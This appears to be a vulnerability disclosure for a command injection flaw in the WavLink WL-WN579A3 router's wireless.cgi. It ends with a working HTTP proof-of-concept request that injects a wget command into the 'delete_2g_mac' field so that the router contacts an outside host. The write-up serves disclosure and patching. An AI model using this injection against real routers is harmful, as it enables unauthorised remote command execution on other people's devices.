# WL-WN579A3 Vulnerability

Vendor:WavLink

Product:WL-WN579A3

Vulnerability: Command Injection

Type:Remote Command Execution




## Descriptions

We found an Command Injection vulnerability  in `wireless.cgi` , allows remote attackers to execute arbitrary OS commands from a crafted request:

In  ftext function,the router compare the `page` parameter.

When the value of `page` is `Delete_Mac_list`, the function sub_4031A8 will be called.

<div  align="center"><img src="./img/ftext.png" style="zoom:80%;" /></div>

the value of the `delete_list` and the `delete_2g_mac` is inserted into `v8`  using `sprintf`,and the value of v8 will be handled by the function sub_404850.

<div  align="center"><img src="./img/sub_4031A8.png" style="zoom:80%;" /></div>

Finally,the command will be executed by  system() in sub_404850

<div  align="center"><img src="./img/sub_404850.png" style="zoom:80%;" /></div>



## Proof of Concept (PoC)

We set `delete_2g_mac` as **;wget 192.168.6.1:6666/testpoc** , and the router will execute it,such as:

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.2
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.6.2/wizard_rep.shtml
Accept-Encoding: gzip, deflate, br
Cookie: session=982433761
Connection: keep-alive
Content-Length: 78

page=Delete_Mac_list&delete_list=&delete_2g_mac=;wget 192.168.6.1:6666/testpoc
```

<div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
<img width="602" height="275" alt="image" src="https://github.com/user-attachments/assets/542a40e5-99ed-4888-b87c-2015c49dd23e" />

